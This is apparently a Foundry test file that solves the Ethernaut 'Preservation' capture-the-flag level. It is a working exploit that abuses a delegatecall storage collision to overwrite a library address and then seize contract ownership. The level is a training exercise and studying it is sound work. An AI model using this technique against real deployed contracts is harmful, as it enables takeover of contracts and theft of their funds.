// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/Preservation.sol';
import '@forge-std/Test.sol';
import '@forge-std/console.sol';

contract Helper {
  // Same storage layout as the Preservation contract.
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;

  function setTime(uint256) public {
    owner = msg.sender;
  }
}

contract PreservationExploit is Test {
  LibraryContract library1;
  LibraryContract library2;
  Preservation target;
  Helper helper;

  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    library1 = new LibraryContract();
    library2 = new LibraryContract();
    target = new Preservation(address(library1), address(library2));
    helper = new Helper();
    console.log('Target contract deployed');
    vm.stopPrank();
  }

  function testExploit() public {
    address owner = target.owner();
    console.log('Current owner: %s', owner);
    assertEq(owner, deployer);

    bytes32 slot0 = vm.load(address(target), bytes32(uint256(0)));
    console.log('Storage at slot 0: %s', vm.toString(slot0));
    console.log('Time zone 1 library address: %s', address(library1));

    vm.startPrank(exploiter);
    // The storage of the library contract collides with the Preservation contract on slot 0.
    // LibraryContract: slot0 (32 bytes)
    // Preservation: slot0 (0-20 address)
    // Our goal here is to override the `timeZone1Library` address to point to a helper contract.
    target.setSecondTime(uint256(uint160((address(helper)))));

    slot0 = vm.load(address(target), bytes32(uint256(0)));
    console.log('New storage at slot 0: %s', vm.toString(slot0));
    console.log('Helper contract address: %s', address(helper));

    // Then we can call the helper contract using `setSecondTime` to override the owner.
    target.setFirstTime(0); // dummy value.
    vm.stopPrank();

    owner = target.owner();
    console.log('New owner: %s', owner);
    assertEq(owner, exploiter);
  }
}
